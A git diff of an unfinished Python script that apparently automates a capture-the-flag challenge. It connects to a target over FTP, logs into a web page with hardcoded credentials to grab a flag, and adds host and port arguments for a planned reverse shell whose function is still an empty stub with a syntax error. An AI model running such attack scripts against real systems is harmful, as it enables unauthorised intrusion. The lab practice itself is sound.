@@ -12,8 +12,11 @@ from subprocess import run
 from ftplib import FTP
 
 tar_ip = sys.argv[1] #target IP
+Host = sys.argv[2] #local IP (your ip)
+Port = sys.argv[3] #port 
 sess = req.Session()
 
+#Needs 'Try' and 'except'
 def Mino_ftp_engine():
 
     with FTP(tar_ip) as conn:
@@ -31,6 +34,7 @@ def Mino_ftp_engine():
 Mino_ftp_engine()
 
 def Mino_web_engine_login():
+    
     url_L = f'http://{tar_ip}/login.php'
     PostData_L = {'email': 'M!n0taur', 'password': 'aminotauro'}
     res = sess.post(url_L, data=PostData_L)
@@ -40,3 +44,15 @@ def Mino_web_engine_login():
     pprint.pprint("Second flag", fetch_href_flag)
 
 Mino_web_engine_login()
+
+'''
+This is taking me longer then i expected.
+Hopefully this wont be a pain in the ass.
+'''
+
+Mino_establish_shell():
+    
+    #Start here
+    
+    
+Mino_establish_shell()
